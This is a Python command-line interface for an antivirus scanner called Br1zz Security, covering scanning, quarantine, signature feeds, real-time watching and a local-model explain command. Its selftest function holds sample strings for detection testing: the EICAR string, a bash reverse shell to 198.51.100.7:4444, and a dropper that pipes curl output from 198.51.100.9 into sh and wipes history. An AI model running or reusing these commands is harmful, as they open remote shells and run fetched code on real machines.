"""Command-line interface for Br1zz Security.

Exit codes follow the antivirus convention:
    0  no threats found
    1  threats found
    2  an error prevented the scan from completing
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import signal
import sys
import tempfile
import threading
import time
from pathlib import Path

from . import __appname__, __version__, scanlog
from .config import CONFIG_FILE, Config, ensure_dirs
from .engine.scanner import Scanner
from .engine.verdict import FileVerdict, ScanSummary, Status
from .quarantine import Quarantine, QuarantineError

EXIT_CLEAN, EXIT_THREATS, EXIT_ERROR = 0, 1, 2


# --------------------------------------------------------------------- colour

class Style:
    def __init__(self, enabled: bool) -> None:
        self.enabled = enabled

    def _wrap(self, code: str, text: str) -> str:
        return f"\033[{code}m{text}\033[0m" if self.enabled else text

    def bold(self, t: str) -> str:   return self._wrap("1", t)
    def dim(self, t: str) -> str:    return self._wrap("2", t)
    def red(self, t: str) -> str:    return self._wrap("31;1", t)
    def green(self, t: str) -> str:  return self._wrap("32", t)
    def yellow(self, t: str) -> str: return self._wrap("33", t)
    def blue(self, t: str) -> str:   return self._wrap("34", t)
    def cyan(self, t: str) -> str:   return self._wrap("36", t)


def make_style(force: bool | None = None) -> Style:
    if force is not None:
        return Style(force)
    if os.environ.get("NO_COLOR") is not None:
        return Style(False)
    return Style(sys.stdout.isatty())


def human_size(n: int) -> str:
    value = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if value < 1024 or unit == "TB":
            return f"{value:.0f} {unit}" if unit == "B" else f"{value:.1f} {unit}"
        value /= 1024
    return f"{value:.1f} TB"


def status_label(style: Style, status: Status) -> str:
    return {
        Status.CLEAN: style.green("CLEAN"),
        Status.SUSPICIOUS: style.yellow("SUSPICIOUS"),
        Status.INFECTED: style.red("INFECTED"),
        Status.ERROR: style.dim("ERROR"),
        Status.SKIPPED: style.dim("SKIPPED"),
    }[status]


# ------------------------------------------------------------------- progress

class ProgressBar:
    """Single-line progress display, redrawn at a fixed rate."""

    def __init__(self, style: Style, enabled: bool) -> None:
        self.style = style
        self.enabled = enabled and sys.stdout.isatty()
        self._last_draw = 0.0
        self._width = shutil.get_terminal_size((80, 24)).columns

    def update(self, path: str, done: int, total: int) -> None:
        if not self.enabled:
            return
        now = time.monotonic()
        if now - self._last_draw < 0.05 and done < total:
            return
        self._last_draw = now

        pct = (done / total) if total else 0.0
        bar_width = 24
        filled = int(bar_width * pct)
        bar = "#" * filled + "-" * (bar_width - filled)

        prefix = f"  [{bar}] {pct * 100:5.1f}%  {done}/{total}  "
        room = max(10, self._width - len(prefix) - 2)
        name = Path(path).name
        if len(name) > room:
            name = name[: room - 1] + "…"
        sys.stdout.write("\r" + prefix + self.style.dim(name) + "\033[K")
        sys.stdout.flush()

    def clear(self) -> None:
        if self.enabled:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()


# ---------------------------------------------------------------------- print

def print_threat(style: Style, verdict: FileVerdict, verbose: bool = False) -> None:
    marker = style.red("INFECTED  ") if verdict.status is Status.INFECTED else style.yellow("SUSPICIOUS")
    print(f"  {marker}  {verdict.path}")
    print(f"              {style.bold(verdict.name)}  {style.dim(f'(score {verdict.score})')}")

    detections = verdict.detections if verbose else verdict.detections[:3]
    for det in detections:
        print(f"              {style.dim('-')} [{det.engine}] {det.name} {style.dim(f'({det.severity.name.lower()})')}")
        if verbose:
            if det.description:
                print(f"                  {style.dim(det.description)}")
            if det.evidence:
                print(f"                  {style.dim('evidence: ' + det.evidence)}")
    hidden = len(verdict.detections) - len(detections)
    if hidden > 0:
        print(f"              {style.dim(f'... and {hidden} more (use -v)')}")
    if verdict.quarantined_id:
        print(f"              {style.blue('quarantined')} {style.dim(verdict.quarantined_id)}")
    print()


def print_summary(style: Style, summary: ScanSummary) -> None:
    print(style.bold("  Summary"))
    print(f"    Files scanned    {summary.scanned}")
    print(f"    Data read        {human_size(summary.bytes_read)}")
    print(f"    Duration         {summary.duration:.2f}s")
    if summary.skipped:
        print(f"    Skipped          {summary.skipped}")
    if summary.errors:
        print(f"    Unreadable       {style.dim(str(summary.errors))}")
    if summary.quarantined:
        print(f"    Quarantined      {style.blue(str(summary.quarantined))}")

    if summary.threat_count == 0:
        print(f"\n  {style.green('No threats found.')}\n")
    else:
        parts = []
        if summary.infected:
            parts.append(style.red(f"{summary.infected} infected"))
        if summary.suspicious:
            parts.append(style.yellow(f"{summary.suspicious} suspicious"))
        print(f"\n  {' / '.join(parts)}\n")


# -------------------------------------------------------------------- scan cmd

def cmd_scan(args: argparse.Namespace, style: Style) -> int:
    config = Config.load()
    if args.threshold is not None:
        config.heuristic_threshold = args.threshold
    if args.no_yara:
        config.enable_yara = False
    if args.no_heuristics:
        config.enable_heuristics = False
    if args.workers:
        config.workers = args.workers
    if args.max_size:
        config.max_file_size = args.max_size

    if args.full:
        roots = [Path("/")]
        config.cross_filesystems = False
    elif args.quick or not args.paths:
        roots = config.expanded_quick_paths()
        if not roots:
            print("No quick-scan paths exist on this system.", file=sys.stderr)
            return EXIT_ERROR
    else:
        roots = [Path(p).expanduser() for p in args.paths]

    missing = [p for p in roots if not p.exists()]
    if missing:
        for path in missing:
            print(f"{style.red('error:')} no such path: {path}", file=sys.stderr)
        return EXIT_ERROR

    scanner = Scanner(config).load()
    quarantine = Quarantine() if args.quarantine or config.auto_quarantine else None

    cancel = threading.Event()

    def on_sigint(_signum, _frame):
        cancel.set()

    previous = signal.signal(signal.SIGINT, on_sigint)

    if not args.json:
        print()
        version_str = __version__ if __version__.startswith('v') else 'v' + __version__
        print(f"  {style.bold(__appname__)} {style.dim(version_str)}")
        print(f"  {style.dim('Scanning: ' + ', '.join(str(r) for r in roots))}")
        if not scanner.yara.available and config.enable_yara:
            print(f"  {style.yellow('note:')} YARA unavailable - running on hashes and heuristics only.")
            print(f"        {style.dim('install with: sudo apt install python3-yara')}")
        print()

    bar = ProgressBar(style, enabled=not args.json and not args.no_progress)
    found: list[FileVerdict] = []

    def on_verdict(verdict: FileVerdict) -> None:
        found.append(verdict)
        if not args.json:
            bar.clear()
            print_threat(style, verdict, args.verbose)

    try:
        summary = scanner.scan(roots, progress=bar.update, cancel=cancel, on_verdict=on_verdict)
    finally:
        signal.signal(signal.SIGINT, previous)
    bar.clear()

    if quarantine is not None:
        for verdict in summary.threats:
            if verdict.status is Status.INFECTED or args.quarantine_suspicious:
                try:
                    entry = quarantine.capture(verdict)
                    verdict.quarantined_id = entry.id
                    summary.quarantined += 1
                except QuarantineError as exc:
                    if not args.json:
                        print(f"  {style.red('quarantine failed:')} {exc}", file=sys.stderr)

    if not args.no_log:
        scanlog.record(summary, kind="full" if args.full else "quick" if args.quick else "manual")

    if args.json:
        print(json.dumps(summary.to_dict(), indent=2))
    else:
        if cancel.is_set():
            print(f"  {style.yellow('Scan cancelled.')}\n")
        print_summary(style, summary)

    return EXIT_THREATS if summary.threat_count else EXIT_CLEAN


# ------------------------------------------------------------------ other cmds

def cmd_status(args: argparse.Namespace, style: Style) -> int:
    config = Config.load()
    scanner = Scanner(config).load()
    quarantine = Quarantine()
    last = scanlog.last_scan()
    engines = scanner.engine_status

    if args.json:
        from .assistant import Explainer
        print(json.dumps({
            "version": __version__,
            "engines": engines,
            "assistant": Explainer(config).status(),
            "quarantined": len(quarantine),
            "last_scan": last,
            "config_file": str(CONFIG_FILE),
        }, indent=2))
        return EXIT_CLEAN

    print()
    version_str = __version__ if __version__.startswith('v') else 'v' + __version__
    print(f"  {style.bold(__appname__)} {style.dim(version_str)}")
    print()
    print(style.bold("  Engines"))

    hashdb = engines["hashdb"]
    hash_state = style.green("ready") if hashdb["enabled"] else style.dim("disabled")
    hash_detail = style.dim(f"{hashdb['signatures']} signatures")
    if hashdb.get("feed_signatures"):
        hash_detail += style.dim(f" ({hashdb['feed_signatures']} from feeds)")
    print(f"    Hash database    {hash_state}  {hash_detail}")

    yara_info = engines["yara"]
    if not yara_info["available"]:
        yara_state = style.yellow("unavailable")
        yara_detail = style.dim("sudo apt install python3-yara")
    elif not yara_info["enabled"]:
        yara_state, yara_detail = style.dim("disabled"), ""
    else:
        yara_state = style.green("ready")
        yara_detail = style.dim(f"{yara_info['rules']} rules")
    print(f"    YARA rules       {yara_state}  {yara_detail}")
    for err in yara_info["errors"]:
        print(f"                     {style.dim(err)}")

    heur = engines["heuristics"]
    heur_state = style.green("ready") if heur["enabled"] else style.dim("disabled")
    heur_detail = style.dim(f"{heur['checks']} checks")
    print(f"    Heuristics       {heur_state}  {heur_detail}")

    # Real-time protection runs as its own process, so report whether the
    # systemd unit is active rather than guessing from the config flag.
    import subprocess
    active = False
    try:
        result = subprocess.run(
            ["systemctl", "--user", "is-active", "br1zz-realtime.service"],
            capture_output=True, text=True, timeout=5,
        )
        active = result.stdout.strip() == "active"
    except (OSError, subprocess.SubprocessError):
        pass

    if active:
        rt_state, rt_detail = style.green("active"), style.dim("systemd service")
    elif config.realtime_enabled:
        rt_state = style.yellow("enabled")
        rt_detail = style.dim("runs with the app; enable the service to run always")
    else:
        rt_state, rt_detail = style.dim("off"), style.dim("br1zz-security watch")
    print(f"    Real-time        {rt_state}  {rt_detail}")

    from .assistant import Explainer
    assistant = Explainer(config).status()
    if not assistant["enabled"]:
        assistant_state, assistant_detail = style.dim("disabled"), ""
    elif not assistant["reachable"]:
        assistant_state = style.yellow("unavailable")
        assistant_detail = style.dim("start Ollama: ollama serve")
    else:
        assistant_state = style.green("ready")
        if assistant.get("cloud_model"):
            # The host is localhost but the model proxies out; say so, because
            # "runs locally" is the whole reason this backend was chosen.
            where = style.yellow("cloud-routed")
        elif assistant["local"]:
            where = "on-device"
        else:
            where = style.yellow("remote host")
        assistant_detail = style.dim(f"{assistant['model']} ") + f"({where})"
    print(f"    AI assistant     {assistant_state}  {assistant_detail}")

    print()
    print(style.bold("  Quarantine"))
    print(f"    Items            {len(quarantine)}")

    print()
    print(style.bold("  Last scan"))
    if last:
        threats = last.get("infected", 0) + last.get("suspicious", 0)
        verdict = style.red(f"{threats} threats") if threats else style.green("clean")
        print(f"    {last.get('started_at', '?')}  {last.get('scanned', 0)} files  {verdict}")
    else:
        print(f"    {style.dim('never')}")
    print()
    return EXIT_CLEAN


def cmd_quarantine(args: argparse.Namespace, style: Style) -> int:
    quarantine = Quarantine()

    if args.quarantine_action in (None, "list"):
        entries = quarantine.entries()
        if args.json:
            print(json.dumps([e.to_dict() for e in entries], indent=2))
            return EXIT_CLEAN
        if not entries:
            print(f"\n  {style.dim('Quarantine is empty.')}\n")
            return EXIT_CLEAN
        print()
        print(f"  {style.bold('ID'):<34} {style.bold('THREAT'):<40} {style.bold('ORIGINAL PATH')}")
        for entry in entries:
            print(f"  {style.cyan(entry.id):<34} {entry.threat[:36]:<31} {style.dim(entry.original_path)}")
            print(f"  {'':<25} {style.dim(entry.quarantined_at)}  {style.dim(human_size(entry.size))}")
        print()
        return EXIT_CLEAN

    if args.quarantine_action == "restore":
        try:
            target = Path(args.target).expanduser() if args.target else None
            path = quarantine.restore(args.id, target=target, force=args.force)
        except QuarantineError as exc:
            print(f"{style.red('error:')} {exc}", file=sys.stderr)
            return EXIT_ERROR
        print(f"  {style.green('restored')} {path}")
        return EXIT_CLEAN

    if args.quarantine_action == "delete":
        try:
            entry_id = quarantine.delete(args.id)
        except QuarantineError as exc:
            print(f"{style.red('error:')} {exc}", file=sys.stderr)
            return EXIT_ERROR
        print(f"  {style.green('deleted')} {entry_id}")
        return EXIT_CLEAN

    if args.quarantine_action == "purge":
        if not args.yes:
            reply = input(f"  Permanently delete all {len(quarantine)} quarantined files? [y/N] ")
            if reply.strip().lower() not in ("y", "yes"):
                print("  Aborted.")
                return EXIT_CLEAN
        count = quarantine.purge()
        print(f"  {style.green('purged')} {count} item(s)")
        return EXIT_CLEAN

    return EXIT_ERROR


def cmd_history(args: argparse.Namespace, style: Style) -> int:
    entries = scanlog.history(limit=args.limit)
    if args.json:
        print(json.dumps(entries, indent=2))
        return EXIT_CLEAN
    if not entries:
        print(f"\n  {style.dim('No scans recorded yet.')}\n")
        return EXIT_CLEAN
    print()
    for entry in entries:
        threats = entry.get("infected", 0) + entry.get("suspicious", 0)
        verdict = style.red(f"{threats} threats") if threats else style.green("clean")
        print(f"  {entry.get('started_at', '?'):<20} {entry.get('kind', 'manual'):<8} "
              f"{entry.get('scanned', 0):>7} files  {entry.get('duration', 0):>7.2f}s  {verdict}")
    print()
    return EXIT_CLEAN


def cmd_selftest(args: argparse.Namespace, style: Style) -> int:
    """Verify each engine end-to-end using harmless synthetic samples."""
    # Assembled at runtime so this source file is not itself an EICAR carrier.
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR" "-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    reverse_shell = "#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n"
    dropper = "#!/bin/sh\ncurl -s http://198.51.100.9/p.sh | sh\nhistory -c\nunset HISTFILE\n"

    scanner = Scanner(Config.load()).load()
    results: list[tuple[str, bool, str]] = []

    with tempfile.TemporaryDirectory(prefix="br1zz-selftest-") as tmpdir:
        tmp = Path(tmpdir)
        cases = [
            ("hash signature (EICAR)", "eicar.com", eicar, Status.INFECTED),
            ("YARA + heuristics (reverse shell)", "rshell.sh", reverse_shell, Status.INFECTED),
            ("heuristics (dropper)", "drop.sh", dropper, Status.SUSPICIOUS),
            ("clean file", "hello.txt", "hello world\n", Status.CLEAN),
        ]
        for label, filename, content, expected in cases:
            target = tmp / filename
            target.write_text(content)
            verdict = scanner.scan_file(target)
            if expected is Status.CLEAN:
                ok = verdict.status is Status.CLEAN
            elif expected is Status.INFECTED:
                ok = verdict.status is Status.INFECTED
            else:
                ok = verdict.status.is_threat
            detail = verdict.name or verdict.status.value
            results.append((label, ok, detail))

    print()
    print(f"  {style.bold('Self-test')}")
    if not scanner.yara.available:
        print(f"  {style.yellow('note:')} YARA is unavailable; those detections fall back to heuristics.")
    print()
    for label, ok, detail in results:
        mark = style.green("PASS") if ok else style.red("FAIL")
        print(f"    [{mark}] {label:<38} {style.dim(detail)}")
    print()

    failed = sum(1 for _, ok, _ in results if not ok)
    if failed:
        print(f"  {style.red(f'{failed} check(s) failed.')}\n")
        return EXIT_ERROR
    print(f"  {style.green('All checks passed.')}\n")
    return EXIT_CLEAN


def cmd_explain(args: argparse.Namespace, style: Style) -> int:
    """Scan one file and have the local model explain the result."""
    from .assistant import Explainer, ExplainerError

    target = Path(args.path).expanduser()
    if not target.exists():
        print(f"{style.red('error:')} no such file: {target}", file=sys.stderr)
        return EXIT_ERROR

    config = Config.load()
    explainer = Explainer(config)
    info = explainer.status()

    if not info["reachable"]:
        print(f"\n  {style.red('The assistant is unavailable.')}")
        print(f"  {style.dim(info['error'])}\n")
        print("  The assistant runs a model locally through Ollama:")
        print(f"    {style.cyan('ollama serve')}                 start the model host")
        print(f"    {style.cyan('ollama pull llama3.2:3b')}      install a small local model\n")
        return EXIT_ERROR

    # Refuse before doing any work, so nothing is sent and the reason is the
    # first thing the user reads.
    if info.get("cloud_model") and not config.assistant_allow_cloud_model:
        print(f"\n  {style.yellow('Blocked: the selected model answers off-machine.')}\n")
        print(f"  {info['model']} is a cloud-routed Ollama tag, so explaining a detection")
        print("  with it would send this file's detection data off your computer.")
        print("  Nothing has been sent.\n")
        print("  Use an on-device model instead:")
        print(f"    {style.cyan('ollama pull llama3.2:3b')}\n")
        print("  Or allow cloud models explicitly:")
        print(f"    {style.cyan('br1zz-security config set assistant_allow_cloud_model true')}\n")
        return EXIT_ERROR

    scanner = Scanner(config).load()
    verdict = scanner.scan_file(target)

    if not args.json:
        print()
        print(f"  {style.bold(target.name)}  {style.dim(str(target.parent))}")
        print(f"  {status_label(style, verdict.status)}  {style.dim(f'score {verdict.score}')}")
        for det in verdict.detections:
            print(f"    {style.dim('-')} [{det.engine}] {det.name}")
        print()

        if info.get("cloud_model"):
            location = style.yellow("cloud-routed")
        elif info["local"]:
            location = style.green("on-device")
        else:
            location = style.yellow("remote host")
        detail = style.dim(f"Assistant: {info['model']} via {info['host']}")
        print(f"  {detail} ({location})")
        print(f"  {style.dim('─' * 60)}\n")

    chunks: list[str] = []
    try:
        for chunk in explainer.explain(verdict, include_content=not args.no_content):
            chunks.append(chunk)
            if not args.json:
                sys.stdout.write(chunk)
                sys.stdout.flush()
    except ExplainerError as exc:
        print(f"\n{style.red('error:')} {exc}", file=sys.stderr)
        return EXIT_ERROR
    except KeyboardInterrupt:
        print("\n  Interrupted.")
        return EXIT_ERROR

    if args.json:
        print(json.dumps({
            "verdict": verdict.to_dict(),
            "assistant": {"model": info["model"], "host": info["host"], "local": info["local"]},
            "explanation": "".join(chunks),
        }, indent=2))
    else:
        print("\n")

    return EXIT_THREATS if verdict.status.is_threat else EXIT_CLEAN


def cmd_sig(args: argparse.Namespace, style: Style) -> int:
    from .engine.hashdb import HashDatabase, hash_file

    database = HashDatabase().load()
    if args.sig_action == "add":
        target = Path(args.target).expanduser()
        if target.is_file():
            digest = hash_file(target).sha256
        elif len(args.target) in (32, 40, 64) and all(c in "0123456789abcdefABCDEF" for c in args.target):
            digest = args.target.lower()
        else:
            print(f"{style.red('error:')} not a file or a hex digest: {args.target}", file=sys.stderr)
            return EXIT_ERROR
        database.add(digest, args.name, args.severity, args.description)
        print(f"  {style.green('added')} {digest}  {style.bold(args.name)}")
        return EXIT_CLEAN

    print(f"  Loaded {style.bold(str(len(database)))} signatures from:")
    for source in database.sources:
        print(f"    {style.dim(source)}")
    return EXIT_CLEAN


def cmd_watch(args: argparse.Namespace, style: Style) -> int:
    """Run real-time protection in the foreground."""
    from .realtime import RealtimeError, RealtimeMonitor
    from .notify import notify_threat

    config = Config.load()
    if args.path:
        config.realtime_paths = [str(Path(p).expanduser()) for p in args.path]
    if args.quarantine:
        config.auto_quarantine = True
    if args.no_notify:
        config.realtime_notify = False

    seen: list[FileVerdict] = []

    def on_threat(verdict: FileVerdict) -> None:
        seen.append(verdict)
        if args.json:
            print(json.dumps(verdict.to_dict()), flush=True)
        else:
            bar = style.red("INFECTED") if verdict.status is Status.INFECTED else style.yellow("SUSPICIOUS")
            stamp = time.strftime("%H:%M:%S")
            print(f"  {style.dim(stamp)}  {bar}  {verdict.path}")
            print(f"            {style.bold(verdict.name)}")
            if verdict.quarantined_id:
                print(f"            {style.blue('quarantined')} {style.dim(verdict.quarantined_id)}")
            # stdout is block-buffered when it is not a terminal, so under
            # systemd a detection would sit in the buffer instead of reaching
            # the journal. A long-running watcher must flush as it goes.
            sys.stdout.flush()
        if config.realtime_notify:
            notify_threat(verdict)

    monitor = RealtimeMonitor(config, on_threat=on_threat)
    try:
        monitor.start()
    except RealtimeError as exc:
        print(f"{style.red('error:')} {exc}", file=sys.stderr)
        return EXIT_ERROR

    if not args.json:
        print()
        print(f"  {style.bold(__appname__)} {style.dim('real-time protection')}")
        for path in monitor.watch_paths():
            print(f"    {style.dim(str(path))}")
        print(f"  {style.green('watching')} {monitor.stats.watches} directories"
              f" {style.dim('- Ctrl-C to stop')}")
        if config.auto_quarantine:
            print(f"  {style.yellow('auto-quarantine is on')} "
                  f"{style.dim('(infected files are isolated automatically)')}")
        print(flush=True)

    try:
        while monitor.running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        monitor.stop()

    if not args.json:
        stats = monitor.stats
        print(f"\n  Stopped after {stats.uptime:.0f}s - "
              f"{stats.scanned} files scanned, {stats.threats} threats")
        for err in stats.errors[-3:]:
            print(f"  {style.dim(err)}")
        print()
    return EXIT_THREATS if seen else EXIT_CLEAN


def cmd_update(args: argparse.Namespace, style: Style) -> int:
    """Refresh hash signatures from public threat-intelligence feeds."""
    from . import feeds as feedmod

    config = Config.load()
    all_feeds = feedmod.load_feeds(getattr(config, "signature_feeds", None))
    store = feedmod.SignatureStore()

    if args.list:
        print()
        print(f"  {style.bold('Signature feeds')}")
        for feed in all_feeds:
            state = style.green("enabled") if feed.get("enabled") else style.dim("disabled")
            print(f"    {feed['name']:<24} {state}")
            print(f"      {style.dim(feed.get('description', ''))}")
            print(f"      {style.dim(feed['url'])}")
        print()
        state = store.feed_state()
        if state:
            print(f"  {style.bold('Last update')}")
            for row in state:
                print(f"    {row['name']:<24} {row['updated']}  {row['count']} signatures")
        print(f"\n  Stored signatures: {style.bold(str(store.count()))}\n")
        return EXIT_CLEAN

    if args.clear:
        store.clear()
        print(f"  {style.green('cleared')} feed signature database")
        return EXIT_CLEAN

    selected = [f for f in all_feeds if f.get("enabled")]
    if args.full:
        selected = [f for f in all_feeds if f["name"] == "malwarebazaar-full"] or selected
    if args.feed:
        selected = [f for f in all_feeds if f["name"] in args.feed]
        if not selected:
            print(f"{style.red('error:')} no feed named {', '.join(args.feed)}", file=sys.stderr)
            return EXIT_ERROR

    if not selected:
        print(f"  {style.yellow('No feeds are enabled.')} See: br1zz-security update --list\n")
        return EXIT_CLEAN

    print()
    print(f"  {style.bold('Updating signatures')}")
    # Say what will be contacted before contacting it.
    for feed in selected:
        print(f"    {style.dim(feed['url'])}")
    print()

    if args.dry_run:
        print(f"  {style.dim('dry run - nothing fetched')}\n")
        return EXIT_CLEAN

    # In-place progress only makes sense on a terminal; piped output would
    # otherwise be littered with escape sequences.
    interactive = not args.json and sys.stdout.isatty()

    def progress(name: str, stage: str) -> None:
        if interactive:
            sys.stdout.write(f"\r  {name:<26} {style.dim(stage + '…')}\033[K")
            sys.stdout.flush()

    results = feedmod.update(selected, store=store, on_progress=progress)
    if interactive:
        sys.stdout.write("\r\033[K")

    if args.json:
        print(json.dumps({
            "results": [vars(r) for r in results],
            "total_signatures": store.count(),
        }, indent=2))
        return EXIT_CLEAN if all(r.ok for r in results) else EXIT_ERROR

    failed = 0
    for result in results:
        if result.ok:
            print(f"  {style.green('ok')}  {result.name:<26} "
                  f"{result.added} new, {result.updated} refreshed "
                  f"{style.dim(f'({human_size(result.bytes_downloaded)})')}")
        else:
            failed += 1
            print(f"  {style.red('fail')} {result.name:<26} {style.dim(result.error)}")

    print(f"\n  Signature database now holds {style.bold(str(store.count()))} hashes.\n")
    return EXIT_ERROR if failed else EXIT_CLEAN


def cmd_config(args: argparse.Namespace, style: Style) -> int:
    config = Config.load()
    if args.config_action == "path":
        print(CONFIG_FILE)
        return EXIT_CLEAN
    if args.config_action == "init":
        path = config.save()
        print(f"  {style.green('wrote')} {path}")
        return EXIT_CLEAN
    if args.config_action == "set":
        field = args.key
        if field not in Config.__dataclass_fields__:
            print(f"{style.red('error:')} unknown setting '{field}'", file=sys.stderr)
            return EXIT_ERROR
        current = getattr(config, field)
        try:
            if isinstance(current, bool):
                value = args.value.lower() in ("1", "true", "yes", "on")
            elif isinstance(current, int):
                value = int(args.value)
            elif isinstance(current, list):
                value = [v.strip() for v in args.value.split(",") if v.strip()]
            else:
                value = args.value
        except ValueError:
            print(f"{style.red('error:')} invalid value for {field}", file=sys.stderr)
            return EXIT_ERROR
        setattr(config, field, value)
        config.save()
        print(f"  {style.green('set')} {field} = {value}")
        return EXIT_CLEAN

    from dataclasses import asdict
    print(json.dumps(asdict(config), indent=2))
    return EXIT_CLEAN


def cmd_gui(args: argparse.Namespace, style: Style) -> int:
    try:
        from .gui.app import run
    except ImportError as exc:
        print(f"{style.red('error:')} GUI unavailable: {exc}", file=sys.stderr)
        print("  Install the GTK4 bindings: sudo apt install python3-gi gir1.2-gtk-4.0 gir1.2-adw-1", file=sys.stderr)
        return EXIT_ERROR
    return run(sys.argv[:1])


# ----------------------------------------------------------------------- parse

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="br1zz-security",
        description=f"{__appname__} - on-demand antivirus scanner for Linux",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  br1zz-security scan ~/Downloads          scan a directory\n"
            "  br1zz-security scan --quick              scan the usual risk areas\n"
            "  br1zz-security scan --full --quarantine  scan everything, isolate what is found\n"
            "  br1zz-security quarantine list           show isolated files\n"
            "  br1zz-security selftest                  verify the engines work\n"
        ),
    )
    parser.add_argument("--version", action="version", version=f"{__appname__} {__version__}")
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    sub = parser.add_subparsers(dest="command")

    scan = sub.add_parser("scan", help="scan files or directories")
    scan.add_argument("paths", nargs="*", help="paths to scan (default: quick scan)")
    scan.add_argument("-q", "--quick", action="store_true", help="scan common risk directories")
    scan.add_argument("-f", "--full", action="store_true", help="scan the whole filesystem")
    scan.add_argument("-v", "--verbose", action="store_true", help="show every detection in full")
    scan.add_argument("--json", action="store_true", help="emit machine-readable JSON")
    scan.add_argument("--quarantine", action="store_true", help="isolate infected files automatically")
    scan.add_argument("--quarantine-suspicious", action="store_true",
                      help="also quarantine merely suspicious files")
    scan.add_argument("--threshold", type=int, metavar="N", help="suspicion score threshold (default 50)")
    scan.add_argument("--workers", type=int, metavar="N", help="parallel worker threads")
    scan.add_argument("--max-size", type=int, metavar="BYTES", help="deep-scan size limit per file")
    scan.add_argument("--no-yara", action="store_true", help="skip YARA rules")
    scan.add_argument("--no-heuristics", action="store_true", help="skip heuristics")
    scan.add_argument("--no-progress", action="store_true", help="suppress the progress bar")
    scan.add_argument("--no-log", action="store_true", help="do not write to scan history")

    status = sub.add_parser("status", help="show engine and quarantine status")
    status.add_argument("--json", action="store_true")

    quarantine = sub.add_parser("quarantine", help="manage isolated files")
    qsub = quarantine.add_subparsers(dest="quarantine_action")
    qlist = qsub.add_parser("list", help="list quarantined files")
    qlist.add_argument("--json", action="store_true")
    qrestore = qsub.add_parser("restore", help="restore a quarantined file")
    qrestore.add_argument("id")
    qrestore.add_argument("-t", "--target", help="restore to a different path")
    qrestore.add_argument("--force", action="store_true", help="overwrite an existing file")
    qdelete = qsub.add_parser("delete", help="permanently delete a quarantined file")
    qdelete.add_argument("id")
    qpurge = qsub.add_parser("purge", help="permanently delete everything in quarantine")
    qpurge.add_argument("-y", "--yes", action="store_true", help="skip the confirmation prompt")
    quarantine.set_defaults(json=False)

    history = sub.add_parser("history", help="show recent scans")
    history.add_argument("-n", "--limit", type=int, default=20)
    history.add_argument("--json", action="store_true")

    sub.add_parser("selftest", help="verify the engines with harmless test samples")

    watch = sub.add_parser("watch", help="run real-time protection in the foreground")
    watch.add_argument("path", nargs="*", help="directories to watch (default: quick-scan paths)")
    watch.add_argument("--quarantine", action="store_true",
                       help="isolate infected files as they are detected")
    watch.add_argument("--no-notify", action="store_true", help="suppress desktop notifications")
    watch.add_argument("--json", action="store_true", help="emit one JSON object per detection")

    update = sub.add_parser("update", help="refresh hash signatures from threat-intel feeds")
    update.add_argument("--list", action="store_true", help="show feeds and last update time")
    update.add_argument("--full", action="store_true",
                        help="use the complete corpus feed instead of the recent one (~42 MB)")
    update.add_argument("--feed", action="append", metavar="NAME", help="update only this feed")
    update.add_argument("--dry-run", action="store_true", help="show what would be fetched")
    update.add_argument("--clear", action="store_true", help="delete all feed-sourced signatures")
    update.add_argument("--json", action="store_true")

    explain = sub.add_parser("explain", help="ask the local AI assistant why a file was flagged")
    explain.add_argument("path", help="file to scan and explain")
    explain.add_argument("--no-content", action="store_true",
                         help="do not include a file excerpt in the prompt")
    explain.add_argument("--json", action="store_true")

    sig = sub.add_parser("sig", help="manage hash signatures")
    ssub = sig.add_subparsers(dest="sig_action")
    sadd = ssub.add_parser("add", help="add a signature from a file or digest")
    sadd.add_argument("target", help="path to a sample, or a hex digest")
    sadd.add_argument("-n", "--name", default="Malware.Custom", help="threat name")
    sadd.add_argument("-s", "--severity", type=int, default=100)
    sadd.add_argument("-d", "--description", default="")
    ssub.add_parser("list", help="show loaded signature sources")

    config = sub.add_parser("config", help="view or change settings")
    csub = config.add_subparsers(dest="config_action")
    csub.add_parser("show", help="print the effective configuration")
    csub.add_parser("path", help="print the config file path")
    csub.add_parser("init", help="write a config file with the current values")
    cset = csub.add_parser("set", help="change a setting")
    cset.add_argument("key")
    cset.add_argument("value")

    sub.add_parser("gui", help="launch the desktop application")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    style = make_style(False if args.no_color else None)
    ensure_dirs()

    if args.command is None:
        parser.print_help()
        return EXIT_CLEAN

    handlers = {
        "scan": cmd_scan,
        "status": cmd_status,
        "quarantine": cmd_quarantine,
        "history": cmd_history,
        "selftest": cmd_selftest,
        "watch": cmd_watch,
        "update": cmd_update,
        "explain": cmd_explain,
        "sig": cmd_sig,
        "config": cmd_config,
        "gui": cmd_gui,
    }
    handler = handlers[args.command]
    try:
        return handler(args, style)
    except KeyboardInterrupt:
        print("\n  Interrupted.")
        return EXIT_ERROR
    except BrokenPipeError:
        return EXIT_CLEAN


if __name__ == "__main__":
    sys.exit(main())
